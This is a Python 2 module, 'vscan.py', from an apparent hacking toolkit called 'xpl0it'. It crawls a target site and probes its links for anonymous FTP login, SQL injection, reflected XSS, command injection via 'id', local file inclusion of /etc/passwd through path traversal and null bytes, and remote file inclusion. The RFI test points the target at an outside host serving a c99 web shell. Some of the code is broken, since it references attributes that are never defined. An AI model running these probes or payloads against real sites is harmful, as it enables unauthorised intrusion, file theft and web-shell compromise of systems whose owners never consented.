#!/usr/bin/python
#vscan.py

#vscan module for xpl0it v0.3
#Coded by wrh1d3 -> wrh1d3[at]gmail[dot]com
#Copyright (c) 2016-2017 J3kill Soft. by wrh1d3

import os, urlparse, time
from bs4 import BeautifulSoup
from ftplib import *

from auxilliary.proxy import *
from auxilliary.browser import *
from auxilliary.utils import *

class vscan:
	
	global vuln_links
	vuln_links = []
	
	def __init__(self, args):
		self.target = check_url(args[1])
		self.proxy = args[2]
		self.proxy_type = args[3]
		self.verbose = args[4]
		self.results = ""
		
	def grab_links(self):
		br = browser()
		
		try:
			site = br.open(self.target)
			src = site.read()
			soup = BeautifulSoup(src, "lxml")
			links = soup.find_all('a')
			for link in links:
				l = link.get("href")
				if "?" in l: 
					vuln_links.append(l)
		except:
			pass
		
	def FTPScan(self):
		Results = ""
		
		try:
			ftp = FTP(self.target)
			ftp.login()
			ftp.retrlines('LIST')
			ftp.quit()
			Results = "Anonymous login OK"
			print "[+] " + Results
		except:
			Results = "Anonymous login failed"
			print "[-] " + Results
			
		return Results
		
	def SQLScan(self):
		global vuln_links
		
		Results = ""
		error_msgs = ["error", "sql error", "syntax error", "invalid", "warning"]
			
		SQLbr = browser() 
			
		for link in vuln_links:
			l = link.split("=")[0]
			
			for i in range(-1, 999999):
				url = self.target + "/" + l + "=" + str(i)
				try:
					site = SQLbr.open(url)
					src = site.read()
				
					for msg in error_msgs:
						if msg in src.lower():
							Results += url + "\n"
							print "[+] " + url
				except:
					pass
				time.sleep(1)
					
		return Results	
			
	def XSSScan(self):
		global vuln_links
		
		Results = ""
		xss_msg = "Hello world!"
		payload = "<script>alert(\"Hello world!\");</script>"
				
		XSSbr = browser() 
			
		for link in vuln_links:
			l = link.split("=")[0]
			url = self.target + "/" + l + "=" + payload
			
			try:
				site = XSSbr.open(url)
				src = site.read()
				if xss_msg in src.lower():
					Results += url + "\n"
					print "[+] " + url
			except:
				pass
			time.sleep(1)
					
		return Results

	def CMDScan(self):
		global vuln_links
		
		Results = ""
		bash_msgs = ["uid=", "permission denied"]
		payload = "id"
			
		CMDbr = browser() 
				
		for link in vuln_links:
			l = link.split("=")[0]
			url = self.target + "/" + l + "=" + payload
			
			try:
				site = CMDbr.open(url)
				src = site.read()
			
				for msg in bash_msgs:
					if msg in src.lower():
						Results += url + "\n"
						print "[+] " + url
			except:
				pass
			time.sleep(1)
					
		return Results		
			
	def LFIScan(self):
		global vuln_links
		
		Results = ""
		root = "root:x:"
		password_file = "/etc/passwd"
		payloads = ["..", "../"]
		
		LFIbr = browser() 
				
		for link in vuln_links:
			l = link.split("=")[0]
			url = self.target + "/" + l + "="
			
			try:
				site = LFIbr.open(url + password_file)
				src = site.read()
				if root in src.lower():
					Results += url + "\n"
					print "[+] " + url
				else:
					site = LFIbr.open(url + password_file + "%00")
					src = site.read()
					if root in src.lower():
						Results += url + "\n"
						print "[+] " + url
					else:
						site = LFIbr.open(url + payloads[0] + password_file)
						src = site.read()
						if root in src.lower():
							Results += url + "\n"
							print "[+] " + url
						else:	
							site = LFIbr.open(url + payloads[0] + password_file + "%00")
							src = site.read()
							if root in src.lower():
								Results += url + "\n"
								print "[+] " + url
							else:
								for i in range(10):
									site = LFIbr.open(url + str(payloads[1]*i) + payloads[0] + password_file)
									src = site.read()
									if root in src.lower():
										Results += url + "\n"
										print "[+] " + url
									else:
										site = LFIbr.open(url + str(payloads[1]*i) + payloads[0] + password_file + "%00")
										src = site.read()
										if root in src.lower():
											Results += url + "\n"
											print "[+] " + url				
			except:
				pass
			time.sleep(1)
				
		return Results	

	def RFIScan(self):
		global vuln_links
		
		Results = ""
		shell = "c99shell"
		payload = "http://www.defcont4.hypersite.com.br/shell/c99.txt?"
		
		RFIbr = browser() 
			
		for link in vuln_links:
			l = link.split("=")[0]
			url = self.target + "/" + l + "=" + payload
			
			try:
				site = RFIbr.open(url)
				src = site.read()
				if shell in src.lower():
					Results += url + "\n"
					print "[+] " + url
			except:
				pass
			time.sleep(1)
					
		return Results

	def scan(self):
		global br
		global vuln_links	
		
		print "\n[+] Target: " + self.target
		if self.verbose == 1:
			print "[!] Checking proxy..."
		
		if self.proxy != "":
			hst, prt = parse_address(self.proxy)
			pr = proxy(hst, prt, self.proxy_type)
			if pr.set_browser_proxy() == True:  
				print "[+] Proxy: " + self.proxy
			else:
				print "[-] Invalid or dead proxy"
		else:
			print "[-] Proxy not set"
				
		print "\n[*] Checking anonymous FTP login..."
				
		self.results = "Anonymous FTP login:\n"
		self.results += self.FTPScan()
		
		print "[*] Checking vulnerables links...\n"
		
		self.grab_links()
		
		if len(vuln_links) == 0:
			self.results += "\nNo vulnerable links found"
			print "[-] No vulnerable links found\n"
		else:
			if self.verbose_mode == 1:
				print "[!] " + str(len(vuln_links)) + " vulnerable links found"
			
			print "[*] Checking SQL vulnerability...\n"
			
			self.results += "\nSQL vulnerability:\n"
			self.results += self.SQLScan()
			
			print "[*] Checking XSS vulnerability...\n"
			
			self.results += "\nXSS vulnerability:\n"
			self.results += self.XSSScan()
				
			print "[*] Checking command injection vulnerability...\n"
			
			self.results += "\nCommand injection vulnerability:\n"
			self.results += self.CMDScan()
			
			print "[*] Checking LFI vulnerability...n"
			
			self.results += "\nLFI vulnerability:\n"
			self.results += self.LFIScan()
			
			print "[*] Checking RFI vulnerability...\n"
			
			self.results += "\nRFI vulnerability:\n"
			self.results += self.RFIScan()
			
	def generate_report(self):
		date = time.strftime("%d-%m-%Y")
		filename = "vscan_report_%s.txt" %(date)
		
		if not os.path.exists(os.getcwd() + "/reports/" + filename): 
			f = open(os.getcwd() + "/reports/" + filename, "w")
			f.writelines("[!] xpl0it penetration testing toolkit -> vscan report\n\n")
			
		f = open(os.getcwd() + "/reports/" + filename, "a")
		f.writelines("Target: " + self.target + "\n")
		f.writelines("Vulnerability: " + self.vuln_name + "\n")
		f.writelines("Results:  \n\n" + self.results + "\n\n")
